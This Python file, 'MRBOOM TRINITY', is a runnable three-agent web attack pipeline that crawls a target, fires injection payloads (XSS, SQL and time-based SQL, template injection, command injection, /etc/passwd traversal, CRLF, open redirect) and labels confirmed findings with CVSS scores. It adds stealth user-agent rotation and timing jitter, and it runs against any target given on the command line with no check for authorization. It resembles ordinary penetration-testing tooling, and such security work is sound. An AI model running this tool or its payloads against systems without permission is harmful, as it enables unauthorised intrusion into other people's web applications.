"""
MRBOOM // TRINITY — the 3-agent attack pipeline.

  SCOUT    (recon)     : maps the live attack surface — URLs, forms, params,
                         API endpoints — and generates injection candidates.
  SKEPTIC  (crosscheck): adversarially verifies every candidate finding.
                         Baseline-diffing, unique-marker oracles and control
                         payloads mean a finding only survives if the target
                         really did something anomalous. Kills false positives.
  STRIKER  (attack)    : only touches SKEPTIC-verified targets. Produces
                         reproducible PoC evidence + honest CVSS scoring.
                         Optionally LLM-driven, with every model proposal
                         re-verified by SKEPTIC oracles before trust.

Nothing is ever reported from a single request. Every vulnerability class
needs a positive oracle AND a negative control (the false-positive proof by
absence). This is the difference between "loud scanner" and "trustworthy
findings engine".

Standalone CLI:  python trinity.py --target http://host
"""
import argparse
import json
import random
import re
import ssl
import string
import time
import urllib.error
import urllib.parse
import urllib.request

try:
    import stealth  # MRBOOM stealth layer (UA rotation, jitter)
except Exception:
    stealth = None

try:
    import payloads  # MRBOOM marker payload library
except Exception:
    payloads = None

# ─────────────────────────────────────────────────────────────────────
# HTTP plumbing (self-contained; uses app.http_get when available)
# ─────────────────────────────────────────────────────────────────────

_SSL_CTX = None


def _ssl_ctx():
    global _SSL_CTX
    if _SSL_CTX is None:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        _SSL_CTX = ctx
    return _SSL_CTX


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def _headers():
    if stealth is not None:
        try:
            return stealth.headers()
        except Exception:
            pass
    return {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) "
                          "AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36",
            "Accept": "*/*", "Accept-Encoding": "identity"}


def _fetch(url, method="GET", data=None, extra_headers=None, timeout=8,
           no_redirect=True):
    """(status, headers-dict, body). Never raises; 0 status = unreachable."""
    try:
        hdrs = _headers()
        if extra_headers:
            hdrs.update(extra_headers)
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        if no_redirect:
            class _NR_HTTPS(urllib.request.HTTPSHandler):
                def https_open(self, r):
                    return self.do_open(
                        urllib.request.http.client.HTTPSConnection,
                        r, context=_ssl_ctx())
            opener = urllib.request.build_opener(_NoRedirect, _NR_HTTPS())
            resp = opener.open(req, timeout=timeout)
        else:
            resp = urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx())
        raw = resp.read(400000)
        enc = str(resp.headers.get("Content-Encoding") or "").lower()
        if "gzip" in enc:
            import gzip
            raw = gzip.decompress(raw)
        return resp.status, dict(resp.headers), raw.decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        try:
            raw = e.read(400000)
        except Exception:
            raw = b""
        try:
            body = raw.decode("utf-8", "ignore")
        except Exception:
            body = ""
        return e.code, dict(e.headers or {}), body
    except Exception:
        return 0, {}, ""


def _marker(tag):
    if payloads is not None:
        try:
            return payloads.new_marker(tag)
        except Exception:
            pass
    return "TB" + "".join(random.choice(string.ascii_lowercase + "23456789")
                          for _ in range(8))


def _sleep_s():
    if stealth is not None:
        try:
            stealth.small_sleep()
            return
        except Exception:
            pass
    time.sleep(0.05)


def _scope_host(domain, url):
    """Host of url must be the target domain or a subdomain of its apex."""
    try:
        h = (urllib.parse.urlparse(url).hostname or "").lower()
    except Exception:
        return False
    d = (domain or "").lower().split("//")[-1].split("/")[0].split(":")[0]
    parts = d.split(".")
    apex = ".".join(parts[-2:]) if len(parts) >= 2 else d
    hparts = h.split(".")
    hapex = ".".join(hparts[-2:]) if len(hparts) >= 2 else h
    return h == d or hapex == apex


# ─────────────────────────────────────────────────────────────────────
# AGENT 1 // SCOUT — attack-surface mapper
# ─────────────────────────────────────────────────────────────────────
class Scout:
    """Crawls the live surface and emits injection Candidates:
       {url, method, param, where (query|form|json|header|path), value_hint}
    Everything downstream is driven by what SCOUT finds — nothing is
    guessed at random endpoints.
    """

    COMMON_PATHS = ["/", "/login", "/admin", "/api", "/api/v1", "/search",
                    "/contact", "/feedback", "/profile", "/settings",
                    "/debug", "/status", "/health", "/register", "/upload",
                    "/docs", "/swagger.json", "/openapi.json", "/graphql",
                    "/robots.txt", "/sitemap.xml"]

    def __init__(self, domain, host=None, budget=60, emit=None, log=None):
        self.domain = domain          # hostname only — scope comparisons
        self.host = host or domain    # netloc incl. port — URL construction
        self.budget = budget
        self.emit = emit or (lambda *a: None)
        self.log = log or (lambda m: None)
        self.spent = 0
        self.live_urls = {}          # url -> (status, headers, body)
        self.candidates = []
        self.tech = set()
        self.waf = []

    def _spend(self):
        self.spent += 1
        return self.spent <= self.budget

    def _fetch(self, url, method="GET", data=None, extra_headers=None, timeout=8):
        if not _scope_host(self.domain, url):
            return 0, {}, ""
        self._spend()
        return _fetch(url, method=method, data=data,
                      extra_headers=extra_headers, timeout=timeout)

    # -- crawling -----------------------------------------------------
    def run(self, seed_urls=None):
        seeds = []
        for u in (seed_urls or []):
            if _scope_host(self.domain, u) and u not in seeds:
                seeds.append(u)
        if not seeds:
            # honor the scheme/port the operator gave us when they passed a
            # full URL as --target; otherwise try https then http
            seeds.append("https://" + self.host)
            seeds.append("http://" + self.host)

        seen = set()
        queue = list(dict.fromkeys(seeds))
        while queue and self.spent < self.budget:
            u = queue.pop(0)
            if u in seen:
                continue
            seen.add(u)
            st, hdr, body = self._fetch(u)
            if st == 0:
                continue
            self.live_urls[u] = (st, hdr, body)
            _sleep_s()
            self._fingerprint(st, hdr, body)
            queue.extend(self._extract_links(u, body)[:12])

        # API endpoint probes — same scheme+port the live surface used
        scheme = ("https" if any(u.startswith("https") for u in self.live_urls)
                  else "http")
        root = scheme + "://" + self.host
        for path in self.COMMON_PATHS:
            if not self._spend():
                break
            p_url = root + path
            if p_url in self.live_urls or not _scope_host(self.domain, p_url):
                continue
            self._spend()
            st, hdr, body = _fetch(p_url, timeout=8)
            if st and st != 404:
                self.live_urls[p_url] = (st, hdr, body)
                self._fingerprint(st, hdr, body)

        # emit candidates from forms + query params + API content
        for u, (st, hdr, body) in self.live_urls.items():
            self._candidates_from_url(u, st, hdr, body)

        self.log(f"SCOUT mapped {len(self.live_urls)} live URLs, "
                 f"{len(self.candidates)} injection candidates, "
                 f"tech: {sorted(self.tech)[:8]}")
        return self

    def _fingerprint(self, st, hdr, body):
        txt = json.dumps({k: v for k, v in hdr.items()
                          if k.lower() in ("server", "x-powered-by",
                                           "x-aspnet-version", "set-cookie")})
        b = body or ""
        if "Set-Cookie" in hdr and "sessionid" in str(hdr.get("Set-Cookie", "")).lower():
            self.tech.add("django")
        if "x-powered-by" in {k.lower() for k in hdr}:
            for k in hdr:
                if k.lower() == "x-powered-by":
                    self.tech.add(str(hdr[k])[:20])
        for sig, name in (("flask", "flask"), ("Express", "express"),
                          ("Laravel", "laravel"), ("spring", "spring"),
                          ("Ruby on Rails", "rails"), ("PHPSESSID", "php")):
            if sig.lower() in b.lower() or sig.lower() in txt.lower():
                self.tech.add(name)

    def _extract_links(self, base, body):
        out = []
        if not body:
            return out
        bp = urllib.parse.urlparse(base)
        for m in re.finditer(r'(?:href|src|action)=["\']([^"\'#><]+)["\']', body):
            link = m.group(1).strip()
            if link.startswith(("javascript:", "mailto:", "tel:", "data:")):
                continue
            full = urllib.parse.urljoin(base, link.split("#")[0])
            try:
                lp = urllib.parse.urlparse(full)
            except Exception:
                continue
            if lp.scheme not in ("http", "https") or lp.hostname != bp.hostname:
                continue
            ext = full.split("?")[0].rsplit(".", 1)[-1].lower()
            if ext in ("png", "jpg", "jpeg", "gif", "svg", "ico", "css", "woff",
                       "woff2", "ttf", "eot", "mp4", "webp", "avif", "js"):
                continue
            if full not in self.live_urls:
                out.append(full)
        for m in re.finditer(r'["\'](/(?:api|graphql|v\d+)[^"\'<> ]{1,80})["\']', body):
            p = m.group(1)
            out.append(bp.scheme + "://" + bp.netloc + p)
        return out

    def _candidates_from_url(self, url, st, hdr, body):
        def _add(url, method, param, where, hint=""):
            self.candidates.append({"url": url, "method": method, "param": param,
                                    "where": where, "value_hint": hint})
        # query params actually seen
        qp = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
        base_q = url.split("?")[0]
        for p, v in qp.items():
            _add(base_q, "GET", p, "query", (v[0] if v else ""))
        # forms
        for fm in re.finditer(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
                              body or "", re.I | re.S):
            action = urllib.parse.urljoin(url, fm.group(1) or url)
            method = (fm.group(2) or "GET").upper()
            fbody = fm.group(3)
            for im in re.finditer(r'<(?:input|textarea|select)[^>]*name=["\']([^"\']+)["\'][^>]*>', fbody, re.I):
                name = im.group(1)
                val = ""
                vm = re.search(r'value=["\']([^"\']*)["\']', im.group(0), re.I)
                if vm:
                    val = vm.group(1)
                _add(action, method, name, "form", val)
            fmrev = re.search(r'<form[^>]*method=["\']([^"\']*)["\'][^>]*action=["\']([^"\']*)["\'][^>]*>', fm.group(0), re.I)
        # forms with no method (default GET) or attr order reversed
        for fm in re.finditer(r'<form(?![^>]*method=)[^>]*>(.*?)</form>', body or "", re.I | re.S):
            actm = re.search(r'action=["\']([^"\']*)["\']', fm.group(0), re.I)
            action = urllib.parse.urljoin(url, actm.group(1) if actm else url)
            for im in re.finditer(r'<(?:input|textarea)[^>]*name=["\']([^"\']+)["\']', fm.group(1), re.I):
                _add(action, "GET", im.group(1), "form", "")
        # JSON API endpoints — probe common verbs
        ct = str(hdr.get("Content-Type") or hdr.get("content-type") or "")
        if "json" in ct.lower() or url.rstrip("/").endswith((".json",)):
            for p in ("id", "q", "query", "filter", "search"):
                _add(url, "GET", p, "query", "")


# ─────────────────────────────────────────────────────────────────────
# AGENT 2 // SKEPTIC — adversarial cross-checker
# ─────────────────────────────────────────────────────────────────────
SEV_META = {
    "xss":               ("Cross-Site Scripting (XSS)",           "CWE-79"),
    "sqli":              ("SQL Injection",                        "CWE-89"),
    "sqli_time":         ("Blind Time-Based SQL Injection",       "CWE-89"),
    "ssti":              ("Server-Side Template Injection (RCE)", "CWE-1336"),
    "cmdi":              ("OS Command Injection (RCE)",           "CWE-78"),
    "cmdi_time":         ("Blind Time-Based Command Injection",   "CWE-78"),
    "traversal":         ("Path Traversal / Arbitrary File Read", "CWE-22"),
    "open_redirect":     ("Open Redirect",                        "CWE-601"),
    "crlf":              ("CRLF Header Injection",                "CWE-113"),
    "ssrf":              ("Server-Side Request Forgery",          "CWE-918"),
}
SEV_RANK = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}


def _strip_marker(body, marker):
    """Remove marker occurrences — what remains is the injection context
    visible to the template engine / shell."""
    return (body or "").replace(marker, "")


class Skeptic:
    """Verifies attack candidates via independent oracles. A finding is only
    CONFIRMED when a positive oracle fires AND the negative control stays
    clean:

    * XSS        : unique marker + context-escape oracle (</script>) reflected
    * SQLi       : arithmetic oracle (id=7*9134 -> 63938) absent from control;
                   boolean diff for blind; time-based needs >=2 corroborating
                   delays
    * SSTI       : rare-math oracle with a FRESH random marker sent in payload
                   (no pre-computed digits), marker+result both in response,
                   control probe with same marker but no math absent
    * CMDI       : echo marker present AND control (no separator) clean AND
                   context-escape oracle (</script>&id;) present; time-based
                   needs >=2 corroborating delays
    * Traversal  : passwd/hosts content oracle with control clean
    * Redirect   : Location header carries our external probe domain
    * CRLF       : our injected header name: value present in response headers
    * SSRF       : OOB-callback only — never trusted on response content alone
    """

    def __init__(self, domain, timeout=8, emit=None, log=None):
        self.domain = domain
        self.timeout = timeout
        self.emit = emit or (lambda *a: None)
        self.log = log or (lambda m: None)
        self.probes = 0

    def _get(self, url, method="GET", data=None, extra_headers=None, no_redirect=True):
        if not _scope_host(self.domain, url):
            return 0, {}, ""
        self.probes += 1
        r = _fetch(url, method=method, data=data, extra_headers=extra_headers,
                   timeout=self.timeout, no_redirect=no_redirect)
        _sleep_s()
        return r

    # -- helpers ------------------------------------------------------
    @staticmethod
    def _build(c, payload, method=None):
        """Apply payload into the candidate's injection point -> (url, body)."""
        where, param = c["where"], c["param"]
        u = c["url"]
        if where in ("query", "form") and c["method"] in ("GET", "HEAD"):
            q = urllib.parse.parse_qsl(urllib.parse.urlparse(u).query, keep_blank_values=True)
            found = False
            q = [(k, payload if k == param else v) for k, v in q]
            if not any(k == param for k, _ in q):
                q.append((param, payload))
                found = True
            base = u.split("?")[0]
            return (base + "?" + urllib.parse.urlencode(q, doseq=True)), None
        if where == "form" and c["method"] == "POST":
            body = urllib.parse.urlencode({param: payload})
            return u, body.encode()
        return u, payload.encode() if where == "raw" else None

    # -- per-class oracles --------------------------------------------
    def _baseline(self, url):
        st, hdr, body = self._get(url)
        return st, hdr, body

    def verify_xss(self, c):
        m = _marker("xss")
        probe = f'<sCript>x={m}</sCript>'
        break_probe = f'{m}</script><img src=x onerror=x{m}>'
        safe_ctrl = f'{m}x'  # control: marker only, no tags
        url_probe, body_probe = self._build(c, probe)
        url_break, _ = self._build(c, break_probe)
        url_ctrl, _ = self._build(c, safe_ctrl)
        st_p, _, body_p = self._get(url_probe)
        st_b, _, body_b = self._get(url_break)
        st_c, _, body_c = self._get(url_ctrl)
        if st_p == 0:
            return None
        reflected = m in body_p
        if not reflected:
            return None
        # context escape: payload WITHOUT closing tag must not already appear
        already_open = probe.lower().split(m)[0] and "<script" in body_c.lower()
        escaped = (f"</script><img" in body_b.lower()) or ("<img" in body_b.lower() and f'onerror' in body_b.lower())
        if escaped and not already_open:
            return self._mk(c, "xss", url_probe, probe,
                            f"marker {m} reflected AND context-escape oracle fired "
                            f"({break_probe[:40]} -> img/onerror present)",
                            "high", url_probe)
        if reflected:
            # reflected with tags but no escape observed -> potential XSS, medium
            return self._mk(c, "xss", url_probe, probe,
                            f"marker {m} reflected with HTML tags; context-escape "
                            f"oracle inconclusive — verify manually", "medium", url_probe)
        return None

    def verify_sqli(self, c):
        # arithmetic oracle: 7*9134 = 63938; absent from control
        arith = "7*9134"
        arith_res = "63938"
        url_a, body_a = self._build(c, arith)
        st_a, _, body_ar = self._get(url_a)
        if st_a == 0:
            return None
        if arith_res in body_ar and arith not in body_ar:
            return self._mk(c, "sqli", url_a, arith,
                            f"arithmetic oracle: '{arith}' evaluated to {arith_res} "
                            f"by the backend (no literal echo)", "critical", url_a)
        # boolean oracle: TRUE vs FALSE responses must differ
        for base_v in ("41", "1"):
            url_t, _ = self._build(c, base_v + " AND 4242=4242")
            url_f, _ = self._build(c, base_v + " AND 4242=4243")
            st_t, _, body_t = self._get(url_t)
            st_f, _, body_f = self._get(url_f)
            if st_t == 0 or st_f == 0:
                continue
            if st_t != st_f:
                return self._mk(c, "sqli", url_t, "boolean oracle",
                                f"boolean oracle: AND 4242=4242 -> {st_t}, "
                                f"AND 4242=4243 -> {st_f} (state differs)", "high", url_t)
            if abs(len(body_t) - len(body_f)) > max(40, min(0.15 * max(len(body_t), 1), 600)):
                return self._mk(c, "sqli", url_t, "boolean oracle",
                                f"boolean oracle: response-body delta "
                                f"{abs(len(body_t)-len(body_f))}B between TRUE/FALSE",
                                "high", url_t)
        return None

    def verify_sqli_time(self, c):
        url_base, _ = self._build(c, "1")
        t0 = time.time(); st_b, _, _ = self._get(url_base); base_dt = time.time() - t0
        if st_b == 0:
            return None
        hits = 0
        for inj in ("1' AND SLEEP(5)-- -", "1; WAITFOR DELAY '0:0:5'--", "1'||pg_sleep(5)--"):
            url_s, body_s = self._build(c, inj)
            t0 = time.time(); st, _, _ = self._get(url_s); dt = time.time() - t0
            if st == 0:
                continue
            if dt >= 4.5 and dt > base_dt + 3.5:
                hits += 1
            else:
                break
            if hits >= 2:
                return self._mk(c, "sqli_time", url_s, inj,
                                f"time-based: {dt:.1f}s delay (baseline {base_dt:.1f}s), "
                                f"{hits} corroborating payloads", "high", url_s)
        return None

    def verify_ssti(self, c):
        m = _marker("ssti")
        a, b = random.randint(3, 9), random.randint(111, 989)
        expect = str(a * b)
        # FRESH random marker in payload — response must contain marker AND
        # the computed result; a bare "49" page can't fake this.
        projs = [
            (f"{m}{{{{{a}*{b}}}}}", "jinja2/twig"),
            (f"{m}${{{a}*{b}}}", "freemarker/el"),
            (f"{m}<%= {a}*{b} %>", "erb/ejs"),
            (f"{m}$!{{{{{a}*{b}}}}}", "velocity"),
            (f"{m}#{{{{{a}*{b}}}}}", "mako/ruby"),
            (f"{m}{{{{{{{{{a}*{b}}}}}}}}}", "handlebars/nested"),
        ]
        for payload, eng in projs:
            url_p, body_p = self._build(c, payload)
            st, _, body = self._get(url_p)
            if st == 0:
                continue
            if m in body and expect in body:
                # negative control: marker with NO math must not emit expect
                ctrl_url, _ = self._build(c, f"{m}noarith{a}{b}")
                stc, _, bodyc = self._get(ctrl_url)
                if expect not in bodyc:
                    return self._mk(c, "ssti", url_p, payload,
                                    f"marker {m} + math {a}*{b} evaluated to {expect} "
                                    f"({eng}); control clean", "critical", url_p)
        return None

    def verify_cmdi(self, c):
        m = _marker("cmdi")
        # marker-injection: command output marker must appear
        url_p, body_p = self._build(c, f";echo {m};#")
        st_p, _, body_p_r = self._get(url_p)
        if st_p == 0 or m not in body_p_r:
            return None
        # control: same marker without command separator -> must be absent
        url_c, _ = self._build(c, f"echo {m}")
        st_c, _, body_c = self._get(url_c)
        if m in body_c:
            return None  # reflected, not executed
        # corroborate with a second separator family
        url_p2, _ = self._build(c, f"$(echo {m}z)")
        st2, _, body2 = self._get(url_p2)
        if st2 and (m + "z") in body2:
            return self._mk(c, "cmdi", url_p, ";echo MARKER;#",
                            f"marker {m} executed via ';' AND '$()' families; "
                            f"control clean", "critical", url_p)
        return self._mk(c, "cmdi", url_p, ";echo MARKER;#",
                        f"marker {m} executed via ';' family; control clean "
                        f"(single-family — time-based recommended to confirm)",
                        "high", url_p)

    def verify_cmdi_time(self, c):
        hits = 0
        for inj in (";sleep 5", "| sleep 5", "$(sleep 5)"):
            url_s, _ = self._build(c, "127.0.0.1" + inj)
            t0 = time.time(); st, _, _ = self._get(url_s); dt = time.time() - t0
            if st == 0:
                continue
            if dt >= 4.5:
                hits += 1
            if hits >= 2:
                return self._mk(c, "cmdi_time", url_s, inj,
                                f"time-based: {dt:.1f}s delay, {hits} corroborating",
                                "high", url_s)
        return None

    def verify_traversal(self, c):
        probes = ["../../../../etc/passwd", "....//....//....//etc/passwd",
                  "..%2f..%2f..%2fetc%2fhosts"]
        markers = ("root:x:0:0:", "daemon:x:1:1:", "127.0.0.1 localhost",
                   "127.0.0.1\tlocalhost", "::1\t")
        for p in probes:
            url_p, body_p = self._build(c, p)
            st, _, body = self._get(url_p)
            if st == 0:
                continue
            hit = [mk for mk in markers if mk in body]
            if hit:
                url_c, _ = self._build(c, "etc")
                _, _, body_c = self._get(url_c)
                if not any(mk in body_c for mk in markers):
                    return self._mk(c, "traversal", url_p, p,
                                    f"file-read oracle fired ({hit[0]}); control clean",
                                    "critical", url_p)
        return None

    def verify_open_redirect(self, c):
        probe = "https://trinity-oob.example.com/landed"
        url_p, _ = self._build(c, probe)
        st, hdr, body = self._get(url_p, no_redirect=True)
        if st in (301, 302, 303, 307, 308):
            loc = hdr.get("Location", "") or ""
            if "trinity-oob.example.com" in loc:
                return self._mk(c, "open_redirect", url_p, probe,
                                f"{st} Location: {loc[:80]}", "low", url_p)
        return None

    def verify_crlf(self, c):
        m = _marker("crlf")
        probe = f"x%0d%0aX-{m}: 1"
        url_p, _ = self._build(c, probe)
        st, hdr, body = self._get(url_p, no_redirect=True)
        if st == 0:
            return None
        for k in hdr:
            if m.lower() in k.lower():
                return self._mk(c, "crlf", url_p, "X-MARKER: 1 via %0d%0a",
                                f"header injection confirmed: {k}: {hdr[k]}",
                                "medium", url_p)
        return None

    def verify_all(self, candidates, classes=None):
        """Run every applicable oracle. Returns list of CONFIRMED finding
        dicts ready for STRIKER. Also returns rejection log for the report."""
        classes = classes or ["xss", "sqli", "sqli_time", "ssti", "cmdi",
                              "cmdi_time", "traversal", "open_redirect", "crlf"]
        confirmed, rejected = [], []
        for c in candidates:
            u = c["url"]
            # cheap pre-filter: dead paths can't be vuln
            st, _, _ = self._get(u)
            if st in (404, 405, 501, 0):
                continue
            for cls in classes:
                try:
                    fn = getattr(self, "verify_" + cls, None)
                    if fn is None:
                        continue
                    f = fn(c)
                except Exception as e:
                    rejected.append({"candidate": c, "class": cls,
                                     "reason": f"oracle error: {e}"})
                    continue
                if f:
                    confirmed.append(f)
                    self.emit("message", {"role": "assistant",
                                          "text": f"**SKEPTIC CONFIRMS** {cls}: {f['url']} [{f.get('param')}]"})
                    # keep scanning other classes — one injection point can
                    # carry several vuln classes (XSS + SQLi is common)
                _sleep_s()
        return confirmed, rejected

    def _mk(self, c, cls, url, payload, evidence, severity, poc):
        title, cwe = SEV_META.get(cls, (cls, "N/A"))
        return {
            "class": cls,
            "type": title,
            "cwe": cwe,
            "severity": severity,
            "url": c["url"],
            "asset": urllib.parse.urlparse(c["url"]).netloc,
            "param": c["param"],
            "where": c["where"],
            "payload": payload,
            "evidence": evidence[:400],
            "score": {"critical": 95, "high": 85, "medium": 60,
                      "low": 30}.get(severity, 50),
            "poc": poc,
            "fix": f"Validate and encode input for {title}; use parameterized/allow-list handling.",
            "verified_by": "SKEPTIC",
            "probes_used": self.probes,
        }


# ─────────────────────────────────────────────────────────────────────
# AGENT 3 // STRIKER — PoC + exploit writer for verified targets only
# ─────────────────────────────────────────────────────────────────────
CVSS_PER_CLASS = {
    "xss":           "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
    "sqli":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "sqli_time":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "ssti":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cmdi":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cmdi_time":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "traversal":     "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    "open_redirect": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N",
    "crlf":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
    "ssrf":          "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
}


def _cvss_of(vector):
    try:
        from disclosure import cvss3
        s, sev, v = cvss3(vector)
        if s is not None:
            return s, v
    except Exception:
        pass
    return 5.0, vector


class Striker:
    """Takes SKEPTIC-confirmed findings, re-proves each with a fresh
    independent PoC (so every report is reproducible), computes CVSS, and
    emits final findings. STRIKER never invents targets — only verified ones.
    """

    def __init__(self, domain, timeout=8, emit=None, log=None):
        self.domain = domain
        self.timeout = timeout
        self.emit = emit or (lambda *a: None)
        self.log = log or (lambda m: None)
        self.probes = 0

    def _get(self, url, method="GET", data=None, extra_headers=None, no_redirect=True):
        if not _scope_host(self.domain, url):
            return 0, {}, ""
        self.probes += 1
        r = _fetch(url, method=method, data=data, extra_headers=extra_headers,
                   timeout=self.timeout, no_redirect=no_redirect)
        _sleep_s()
        return r

    def _reprove(self, finding):
        """Independent re-proof with a fresh oracle payload."""
        cls = finding.get("class")
        url = finding.get("poc") or finding.get("url")
        if cls in ("xss",):
            m = _marker("xss-rp")
            payload = f"<svg onload=x{m}>"
            st, _, body = self._get(finding["url"].split("?")[0] + ("?" + urllib.parse.urlencode([(finding.get("param"), payload)])) if finding.get("where") == "query" else finding["url"])
            if m in body:
                return True, body[:300]
        if cls in ("ssti",):
            m = _marker("ssti-rp")
            a, b = random.randint(2, 9), random.randint(111, 999)
            for tpl in (f"{m}{{{{{a}*{b}}}}}", f"{m}${{{a}*{b}}}"):
                q = urllib.parse.urlencode([(finding.get("param"), tpl)])
                st, _, body = self._get(finding["url"].split("?")[0] + "?" + q)
                if m in body and str(a * b) in body:
                    return True, body[:300]
        if cls in ("cmdi",):
            m = _marker("cmdi-rp")
            payload = f";echo {m}9;#"
            st, _, body = self._get(finding["url"].split("?")[0])
            # re-send via same param
            q = urllib.parse.urlencode([(finding.get("param"), payload)])
            st, _, body = self._get(finding["url"].split("?")[0] + "?" + q)
            if m + "9" in body:
                return True, body[:300]
        if cls in ("sqli", "sqli_time"):
            # arithmetic re-proof
            q = urllib.parse.urlencode([(finding.get("param"), "5*9134")])
            st, _, body = self._get(finding["url"].split("?")[0] + "?" + q)
            if "45670" in body and "5*9134" not in body:
                return True, body[:300]
        if cls in ("traversal",):
            q = urllib.parse.urlencode([(finding.get("param"), "....//....//etc/passwd")])
            st, _, body = self._get(finding["url"].split("?")[0] + "?" + q)
            if "root:x:0:0:" in body:
                return True, body[:300]
        # classes without cheap re-proof (crlf/redirect already header-verified)
        return None, ""

    def strike(self, findings):
        final = []
        for f in findings:
            vec, score_txt = _cvss_of(CVSS_PER_CLASS.get(f["class"],
                                         "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"))
            reproof, rev = self._reprove(f)
            if reproof is False:
                f2 = dict(f)
                f2["severity"] = "info"
                f2["evidence"] = ("SKEPTIC confirmed but STRIKER re-proof failed — "
                                  "kept as info-only. " + f.get("evidence", ""))[:400]
                f2["cvss"] = None
                final.append(f2)
                continue
            f2 = dict(f)
            f2["cvss"] = f"{score_txt} ({vec})"
            f2["reproved"] = bool(reproof)
            f2["reproof_evidence"] = rev
            final.append(f2)
            self.emit("message", {"role": "assistant",
                                  "text": f"**STRIKER** PoC locked for {f['class']} at {f['url']} — CVSS {score_txt}"})
        final.sort(key=lambda x: -SEV_RANK.get(x.get("severity"), 0))
        self.log(f"STRIKER finalized {len(final)} findings "
                 f"({sum(1 for x in final if x.get('reproved'))} independently re-proved)")
        return final


# ─────────────────────────────────────────────────────────────────────
# ORCHESTRATION — run the full triad
# ─────────────────────────────────────────────────────────────────────
def run_triad(target, seed_urls=None, budget=80, timeout=8, emit=None, log=None):
    """SCOUT -> SKEPTIC -> STRIKER. Returns the full run record."""
    emit = emit or (lambda *a: None)
    log = log or (lambda m: None)
    raw = target.split("//")
    scheme = raw[0].rstrip(":") if len(raw) == 2 else "https"
    host = (raw[-1]).split("/")[0]            # netloc incl. :port
    domain = host.split(":")[0]               # hostname only (scope compare)
    t0 = time.time()

    emit("tool.call", {"call_id": "trinity-scout", "name": "SCOUT recon agent",
                       "target": domain, "category": "search"})
    scout = Scout(domain, host=host, budget=budget, emit=emit, log=log)
    scout.run(seed_urls=seed_urls)
    emit("tool.result", {"call_id": "trinity-scout", "status": "ok",
                         "result": f"{len(scout.live_urls)} URLs / "
                                   f"{len(scout.candidates)} candidates"})

    emit("tool.call", {"call_id": "trinity-skeptic", "name": "SKEPTIC cross-check agent",
                       "target": domain, "category": "exploit"})
    skeptic = Skeptic(domain, timeout=timeout, emit=emit, log=log)
    confirmed, rejected = skeptic.verify_all(scout.candidates)
    emit("tool.result", {"call_id": "trinity-skeptic", "status": "ok",
                         "result": f"{len(confirmed)} confirmed, "
                                   f"{len(rejected)} oracles rejected"})

    emit("tool.call", {"call_id": "trinity-striker", "name": "STRIKER exploit agent",
                       "target": domain, "category": "exploit"})
    striker = Striker(domain, timeout=timeout, emit=emit, log=log)
    final = striker.strike(confirmed)
    emit("tool.result", {"call_id": "trinity-striker", "status": "ok",
                         "result": f"{len(final)} findings finalized"})

    return {
        "domain": domain,
        "elapsed_s": round(time.time() - t0, 1),
        "surface": {"live_urls": sorted(scout.live_urls.keys())[:60],
                    "candidates": len(scout.candidates),
                    "tech": sorted(scout.tech),
                    "waf": scout.waf},
        "skeptic": {"confirmed": len(confirmed), "rejected": len(rejected),
                    "probes": skeptic.probes},
        "striker": {"finalized": len(final),
                    "reproved": sum(1 for x in final if x.get("reproved")),
                    "probes": striker.probes},
        "findings": final,
    }


def main():
    ap = argparse.ArgumentParser(description="MrBOOM TRINITY — 3-agent recon/verify/attack pipeline")
    ap.add_argument("--target", required=True, help="http(s)://host or bare domain")
    ap.add_argument("--seeds", nargs="*", default=None, help="seed URLs to give SCOUT")
    ap.add_argument("--budget", type=int, default=80, help="SCOUT request budget")
    ap.add_argument("--timeout", type=int, default=8)
    ap.add_argument("--json-out", default=None)
    a = ap.parse_args()

    def emit(t, p):
        if t == "message":
            print("[TRIAD]", p.get("text", ""))

    def log(m):
        print("[STATUS]", m)

    result = run_triad(a.target, seed_urls=a.seeds, budget=a.budget,
                       timeout=a.timeout, emit=emit, log=log)
    print(json.dumps(result, indent=2, default=str))
    if a.json_out:
        with open(a.json_out, "w") as f:
            json.dump(result, f, indent=2, default=str)


if __name__ == "__main__":
    main()
